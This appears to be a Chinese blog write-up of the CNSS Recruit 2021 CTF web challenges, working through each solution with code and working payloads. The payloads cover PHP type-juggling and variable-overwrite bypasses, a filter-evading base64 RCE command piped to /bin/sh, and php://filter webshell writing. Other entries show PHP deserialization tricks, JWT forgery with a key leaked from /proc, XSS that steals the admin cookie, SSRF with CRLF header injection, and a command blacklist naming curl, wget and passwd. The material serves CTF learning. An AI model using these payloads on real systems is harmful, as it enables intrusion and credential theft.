---
title: CNSS Recruit 2021 WriteUp - Web
date: 2021-10-10 14:20:13
categories:
  - CTF
---

## Signin

考点：HTTP，略

Flag: `CNSS{Y0u_kn0w_GET_and_POST}`

<!-- more -->

## D3buger

考点：F12，略

Flag: `CNSS{Wh4t_A_Sham3le55_thI3f}`

## GitHacker

考点：Git泄露

Git_Extract直接出，略

Flag: `CNSS{Ohhhh_mY_G0d_ur3_real_G1th4ck3r}`

## 更坑的数学题

考点：脚本提交，略

Flag: `CNSS{w#y_5o_f4st?}`

## Ezp#p

考点：md5弱类型比较、变量覆盖

开局给出源码：

```php
<?php
    error_reporting(0);
    require_once("flag.php");
    show_source(__FILE__);

    $pass = '0e0';
    $md55 = $_COOKIE['token'];
    $md55 = md5($md55);

    if(md5($md55) == $pass){
        if(isset($_GET['query'])){
            $before = $_GET['query'];
            $med = 'filter';
            $after = preg_replace(
                "/$med/", '', $before
            );
            if($after === $med){
                echo $flag1;
            }
        }
        $verify = $_GET['verify'];
    }

    extract($_POST);
    
    if(md5($verify) === $pass){
        echo $$verify;
    }
?>
```

很容易发现前面要个`双md5结果=='0e0'`的字符串，直接写脚本爆破，以`0e`开头且后续全为数字的结果均可，下面放几组数据：

- GVFZGmgch9qESfNw54cKdTNF0 → 0e469838894333987269972781781986
- 94Cn9XdCvqCRdmuIPax4RhNbO → 0e379134038691491679445959388876
- TnNWN7CJNeEwnDUufjFOYfghF → 0e395676296685910233596520673732
- GLStMewt5teWh1aDrhlo8cmkd → 0e357637617245137951454124773614
- jTg6WQHGwlAD6c1bMjpTOOdod → 0e268005955025320285425676612293

过了之后是一个正则匹配替换，双写`filfilterter`可绕过

最后是强比较，通过`extract()`提交POST数据将`$verify`和`$pass`全部覆盖为数组，即可绕过

Flag: `CNSS{B4by_9h9_Tr1ck}`

## China Flag

考点：HTTP 头

验证了Referer、XFF，然后有点小脑洞，验证了Accept-Language的值只能包含`zh-cn`

Payload：

```shell
curl http://81.68.109.40:30002/china.php -H 'Referer: http://81.68.109.40:30002/index.php' -H 'X-Forwarded-For: 127.0.0.1' -H 'Accept-Language: zh-cn'
```

Flag: `CNSS{ohHHHHH~~~Ch1ne5e_Kungfu!}`

## BlackPage

考点：PHP伪协议、RCE读取文件

首页源码发现注释：

```php+HTML
<!-- \<\?phps
$file = $_GET["file"];
$blacklist = "(**blacklist**)";
if (preg_match("/".$blacklist."/is",$file) == 1){
  exit("Nooo,You can't read it.");
}else{
  include $file;
}
//你能读到 mybackdoor.php 吗？

---->
```

然后就去读mybackdoor.php，用的PHP伪协议：`php://filter/read=convert.base64-encode/resource=mybackdoor.php`

```php
<?php
error_reporting(0);
function blacklist($cmd){
  $filter = "(\\<|\\>|Fl4g|php|curl| |0x|\\\\|python|gcc|less|root|etc|pass|http|ftp|cd|tcp|udp|cat|×|flag|ph|hp|wget|type|ty|\\$\\{IFS\\}|index|\\*)";
  if (preg_match("/".$filter."/is",$cmd)==1){  
      exit('Go out! This black page does not belong to you!');
  }
  else{
    system($cmd);
  }
}
blacklist($_GET['cmd']);
?>
```

使用Base64绕过关键字过滤，使用`%09`绕过空格过滤，RCE拿flag，Payload：`echo%09Y2F0IC9GbDRnX2lzX2hlcmU=|base64%09-d|/bin/sh`

Flag: `CNSS{0ops!Y0u_G0t_My_Bl4ckp4ge!}`

## 太极掌门人

考点：PHP伪协议写文件、条件竞争

开局拿源码：

```php
<?php
    error_reporting(0);
    show_source(__FILE__);
    function deleteDir($path) {
        if (is_dir($path)) {
            $dirs = scandir($path);
            foreach ($dirs as $dir) {
                if ($dir != '.' && $dir != '..') {
                    $sonDir = $path.'/'.$dir;
                    if (is_dir($sonDir)) {
                        deleteDir($sonDir);
                        @rmdir($sonDir);
                    } elseif ($sonDir !== './index.php'
                            && $sonDir !== './flag.php') {
                        @unlink($sonDir);
                    }
                }
            }
            @rmdir($path);
        }
    }
    $devil = '<?php exit;?>';
    $goods = $_POST['goods'];
    file_put_contents($_POST['train'], $devil . $goods);
    sleep(1);
    deleteDir('.');
?>
```

很明显，由于`exit;`的存在，不能直接写入任意代码。于是想到伪协议`php://filter/write=convert.base64-decode/resource=shell.php`，需要注意的是这里填入Payload的时候需要添加一个前缀字符保证Base64能够正常解码

写shell之后使用脚本或手动访问就能拿到输出了（1s的时间还是可以直接访问的）

参考：<https://www.cnblogs.com/Pinging/p/8597521.html>

// TODO: 似乎还有其他解法

Flag: `CNSS{F45ter_7han_Re5per}`

## bestLanguage

考点：数组绕过`preg_match`(?)、Fast Destruct

开局拿源码：

```php
<?php

error_reporting(0);

class superGate{
    public $gay = true;

    function __destruct(){
        echo file_get_contents("/flag");
        die();
    }
}

$p = $_GET['p'];
$honey = unserialize($p);
if(preg_match("/superGate/i", serialize($honey))){
    echo "no";
    throw Exception();
}

show_source(__FILE__);
```

Fast Destruct，即构造畸形的序列化字符串来提前产生报错退出从而后续`preg_match`函数就不会被执行，直接出flag

Payload：`p=O:9:"superGate":1:{s:3:"gay1";b:1;}`

参考：<https://zhuanlan.zhihu.com/p/405838002>

// TODO: 出题人的预期解是数组绕过，但目前还没弄明白咋回事

Flag: `cnss{Array_Tr1ck_is_use4}`

## To_be_Admin

考点：JWT越权、/proc目录

首页只有一个按钮，点击跳转到`/admin`，提示你是Guest，要成为Admin才能拿flag。

于是摸Cookie，摸到token字段，很明显的JWT：

![](https://hujiekang.top/images/uploads/big/02a877bdfa2c60c625011abc2cae3cdc.png)

丢进<https://jwt.io>分析，修改Payload数据为admin，直接打过去发现验证了签名，所以必须找到签名的那个key

此时发现首页下面的一行小字：

> Access /read to read file what you want.

最终通过`/proc/self/environ`读取到环境变量，找到了`KEY=nWMfdan2349r*fn9dMz`，修改数据签名后打过去获得flag

Flag: `CNSS{00000k_Y0u_are_Adm1n_n0w}`

## To_be_Admin_Again

考点：serialize_handler，略，参见[链接](/2020/03/10/jarvisoj-wp/#phpinfo)

Flag: `CNSS{Admin_1s_w4tch1ng_y0u}`

## To_be_Admin_Again_and_Again

考点：XSS、CSRF、哈希爆破

题干中信息如下，很明显看出是CSRF：

> 你的每一条留言都会由管理员 (的 bot) 亲自查看，快写下你想对 CNSS 说的话吧！

![](https://hujiekang.top/images/uploads/big/827bb83834b1a06bf26725c09659e09f.png)

很容易发现Name输入框和Email输入框存在XSS，通过Preview按钮可以看的更直观一些

之后就是注入一个`<form>`，利用JS自动提交Cookie到自己的服务器上面，随后Admin就会访问提交的页面，Cookie就会直接打到服务器上

![](https://hujiekang.top/images/uploads/big/7e75f8ec377fab00afb1322312577c73.png)

然后使用Cookie访问`/admin`获得flag

Flag: `CNSS{Admin_1s_AAAAAAAAAngry}`

## To_be_Admin_Again_and_Again_and_Again

考点：SSRF、Linux `/proc`文件系统、CVE-2019-9740

（唯一一道有内网的题，出题人把`/proc`玩明白了属于是

主页提示`/request`接口，可以访问一个链接返回结果：

![](https://hujiekang.top/images/uploads/big/60229c89d68f3f7246646629f37c765d.png)

稍微试了几个协议，发现只有`http://`、`https://`和`file://`可以用，于是借助`/proc/self/cwd`可以读到app.py源代码：

```python
import urllib.parse
import urllib.request

from flask import Flask, request, render_template

app = Flask(__name__)
SCHEME = ['http', 'https', 'file']


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/request')
def req():
    url = request.args.get('url')
    if url:
        if urllib.parse.urlparse(url).scheme not in SCHEME:
            return 'Invalid scheme'
        with urllib.request.urlopen(url) as f:
            return f.read()
    else:
        return 'Please enter a URL'


if __name__ == '__main__':
    app.run('0.0.0.0')
```

至此卡住，因为除了这个以外并没有翻到其他有价值的信息和其他的接口。倒是搜索了一下代码发现Python urllib里面这个`urlopen()`方法有一个CRLF注入的CVE，也就是CVE-2019-9740

因为题目也要求不能使用扫描器，所以也没有去扫描本机的端口（至此并没有想起SSRF还可以打内网）

直到某一天突然被另一个师傅点醒可以打内网，这个时候才想起接着去翻`/proc`，发现`/proc/net`可以查看网络相关的状况。查看路由表`/proc/net/route`，发现只有去网关的路由；TCP连接`/proc/net/tcp`只有Flask与外部IP的连接；最后查看ARP表`/proc/net/arp`，在一堆`00:00:00:00:00:00`中发现了一个看起来挺合理的MAC，对应的IP是`172.16.233.233`（看着就很可疑）

![](https://hujiekang.top/images/uploads/big/31b2544c792fcd760eea74108554ebc7.png)

考虑到Flask默认监听5000端口，且题目不要求使用扫描器，所以访问一下看看，果然有东西：

> Try /source ?

访问`/source`拿到源码：

```python
from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def index():
    return 'Try /source ?'

@app.route('/source')
def source():
    with open('app.py') as f:
        return f.read()

@app.route('/admin')
def admin():
    c = request.cookies.get('admin')
    if c and c == '6a9e47ca067b07047e3d571512ec4f82':
        with open('/flag') as f:
            return f.read()
    else:
        return 'Only admin can read the flag'

if __name__ == '__main__':
    app.run('0.0.0.0')
```

发现`/admin`接口，是验了一个Cookie的值，但是很明显目前SSRF限制死了协议类型是没法带Cookie过去的，所以唯一的思路就是之前摸到的CVE-2019-9740，借助换行符来强行注入一个HTTP Cookie头，就可以实现目的了。最终Payload：`/request?url=http://172.16.233.233:5000/admin%20HTTP/1.1%0d%0aCookie:%20admin=6a9e47ca067b07047e3d571512ec4f82;%0d%0aTest:%20123`，这个Payload最终得到的HTTP Header应该是下面这样的：

```http
GET /admin HTTP/1.1
Cookie: admin=6a9e47ca067b07047e3d571512ec4f82;
Test: 123 HTTP/1.1
Host: 172.16.233.233:5000
...
```

CVE-2019-9740复现：<https://www.freesion.com/article/7460341704/>

Flag：`CNSS{ssrf&urllib_ar3_dddddd4nger0us}`

## King of PHP

考点：PHP源码泄露、PHP Extension逆向

开局拿源码：

```php
<?php
if (isset($_GET['secret'])) {
    you_may_need_ida($_GET['secret']);
} else {
    highlight_file(__FILE__);
}

// Why not try html.tar.gz
```

然后就是按照注释提示去下载整个站的源码，解压出来有一个`this_may_help.php`内容是`phpinfo()`，以及一个`hello.so`文件

查看`phpinfo()`，发现这个`hello.so`是个PHP扩展，并且以及加载进了Web环境中：

![](https://hujiekang.top/images/uploads/big/90c4330b7698ff01e324c1a15f679723.png)

所以接下来要做的就是搞懂`you_may_need_ida()`干了啥，直接IDA走起，发现对应C语言函数`zif_you_may_need_ida()`

```c
__int64 __fastcall zif_you_may_need_ida(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // r12
  __int64 v4; // [rsp+8h] [rbp-50h] BYREF
  __int64 v5; // [rsp+10h] [rbp-48h] BYREF
  __int64 v6; // [rsp+18h] [rbp-40h] BYREF
  char v7[24]; // [rsp+20h] [rbp-38h] BYREF
  unsigned __int64 v8; // [rsp+38h] [rbp-20h]

  v8 = __readfsqword(0x28u);
  if ( *(_DWORD *)(a1 + 44) != 1 )
    return zend_wrong_parameters_count_error(1LL, 1LL);
  if ( *(_BYTE *)(a1 + 88) == 6 )
  {
    v4 = *(_QWORD *)(a1 + 80);
LABEL_4:
    some_magic();
    v1 = php_base64_decode_ex(v4 + 24, *(_QWORD *)(v4 + 16), 0LL);
    v5 = v1 + 24;
    v2 = *(_QWORD *)(v1 + 16) + v1 + 24;
    v6 = php_var_unserialize_init();
    php_var_unserialize(v7, &v5, v2, &v6);
    php_var_dump(v7, 0LL);
    return v8 - __readfsqword(0x28u);
  }
  if ( (unsigned int)zend_parse_arg_str_slow(a1 + 80, &v4) )
    goto LABEL_4;
  return zif_you_may_need_ida_cold(v4);
}
```

最一开始看这个代码的时候我是比较懵逼的，因为前面的两个if判断里面的偏移量我根本不知道代表的是什么，直到我自己写了一个PHP Extension，一对比才发现，核心代码只有这么几行，其他的都只是PHP用于处理参数的和其他的一些判断逻辑：

```c
some_magic();
// PHPAPI zend_string *php_base64_decode_ex(const unsigned char *str, size_t length, zend_bool strict)
v1 = php_base64_decode_ex(v4 + 24, *(_QWORD *)(v4 + 16), 0LL);
v5 = v1 + 24;
v2 = *(_QWORD *)(v1 + 16) + v1 + 24;
v6 = php_var_unserialize_init();
// PHPAPI int php_var_unserialize(zval *rval, const unsigned char **p, const unsigned char *max, php_unserialize_data_t *var_hash);
php_var_unserialize(v7, &v5, v2, &v6);
// PHPAPI void php_var_dump(zval *struc, int level);
php_var_dump(v7, 0LL);
```

接着通过对比结合对应的函数定义，很容易看出来一些偏移量的指代值：

- `v4 + 24`：具体的数据值
- `v4 + 16`：数据的长度

所以这段代码用PHP表示起来就是：

```php
<?php
$tmp = $_GET['secret'];
some_magic(&$tmp);
var_dump(unserialize(base64_decode($tmp)));
```

接下来看`some_magic()`函数：

```c
void __fastcall some_magic(__int64 a1)
{
  unsigned __int64 i; // rdx
  char v2; // al

  if ( *(_QWORD *)(a1 + 16) )
  {
    for ( i = 0LL; *(_QWORD *)(a1 + 16) > i; ++i )
    {
      while ( 1 )
      {
        v2 = *(_BYTE *)(a1 + i + 24);
        if ( (unsigned __int8)(v2 - 65) > 0x19u )
          break;
        v2 = -101 - v2;
LABEL_4:
        *(_BYTE *)(a1 + i++ + 24) = v2;
        if ( *(_QWORD *)(a1 + 16) <= i )
          return;
      }
      if ( (unsigned __int8)(v2 - 97) > 0x19u )
      {
        if ( (unsigned __int8)(v2 - 48) > 9u )
        {
          if ( v2 == 43 )
          {
            v2 = 47;
          }
          else if ( v2 == 47 )
          {
            v2 = 43;
          }
        }
        else
        {
          v2 = 105 - v2;
        }
        goto LABEL_4;
      }
      *(_BYTE *)(a1 + i + 24) = -37 - v2;
    }
  }
}
```

能够看出是在对字符串进行一个遍历和处理替换的过程。代码的可读性很差，所以我的处理方法是直接复制然后传参进去执行（对于一些数据类型需要进行对应的修改），看看不同的字符最终的处理结果是什么，输出如下：

```c
char str1[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890=/+";
char* str = str1;
printf("Before: %s\n", str);
some_magic(str);
printf("After : %s\n", str);

// Output:
// Before: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890=/+
// After : zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA8765432109=+/
```

很明显就是做了一个字符的代换，是存在一个一对一的关系的，所以接下来的事情就很简单了，写一个脚本，传一个stdClass试试看：

```python
before = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890=/+"
after  = "zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA8765432109=+/"
data = "Tzo4OiJzdGRDbGFzcyI6MTp7czoxOiJiIjtzOjE6ImMiO30="
res = "".join([after[before.index(char)] for char in data])
print(data, res)
```

符合预期。

![](https://hujiekang.top/images/uploads/big/2ce9b183c44aa253ad5fe283ca9b5c43.png)

在这里又卡住了一阵子，因为只有反序列化的操作也没法进行任何的利用，只能再去那个Extension里面翻一翻，果然又翻到了一个类`Hello`：

```c
__int64 zm_startup_hello()
{
  __int64 v0; // rax
  _BYTE _0[472]; // [rsp+0h] [rbp+0h] BYREF

  *(_QWORD *)&_0[456] = __readfsqword(0x28u);
  memset(_0, 0, 0x1C8uLL);
  *(_QWORD *)&_0[8] = zend_string_init_interned("Hello", 5LL, 1LL);
  *(_QWORD *)&_0[432] = &hello_methods;
  v0 = zend_register_internal_class(_0);
  zend_declare_property_string(v0, "name", 4LL, "/etc/passwd", 4LL);
  return 0LL;
}
```

不难看出注册了一个类，这个类里面只有一个属性值名为`name`，默认值为`/etc/passwd`，是一个私有属性（对应宏`ZEND_ACC_PRIVATE`）。还原为PHP代码如下：

```php
class Hello {
    private $name = "/etc/passwd";
}
```

于是将这个类序列化后输出，发现可以读取对应文件，于是将`name`值改为`/flag`即可拿到flag。Payload：`secret=Gal5LrQawTIWyTUaxbR3NGk2xalcLrQrRqgaLqV3RnNrL69=`

![](https://hujiekang.top/images/uploads/big/0a1ce3ae84162795e38ff2e112543e7b.png)

**参考：**

- <https://www.zend.com/extension-skeleton-file-content>
- <https://laravelacademy.org/post/7285>
- <https://github.com/php/php-src>

Flag: `CNSS{PHP_1s_th3_BEST_langu4ge}`

## WinWinWinWin

考点：内网渗透

（都是靠回忆写的， 毕竟只拿下了Web）

开局一个GreenCMS，基于ThinkPHP3.2.1，给出源码，根目录下有个`xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.php`是一个一句话，提示文件名是随机的32位字符，尝试include这个文件来Getshell。

收群友启发，用D盾扫了一下源码，扫到敏感接口

```php
public function b136ee6c797c1a851260b9c1ab5ff414()
{
    if (isset($_GET['8c7dd922ad47494fc02c388e12c00eac'])) {
        require_once $_GET['8c7dd922ad47494fc02c388e12c00eac'];
    };
}
```

加上这台机器是Windows机器，结合一个Windows API`FindFirstFile`的一些特性（参考[读DEDECMS找后台目录有感_吾爱漏洞 (52bug.cn)](http://www.52bug.cn/hkjs/4915.html)）就能够读到根目录下的那个一句话，从而实现Getshell。

然后进去看发现是个Windows 10，普通域内用户`cnss\pcuser`，所以尝试提权，然后尝试失败

扫内网，有一台DC，一台Exchange和一台MSSQL，IP不记得了

然后就没有然后了，而且搭建的环境也老崩，等我再想去看看的时候环境已经关掉了

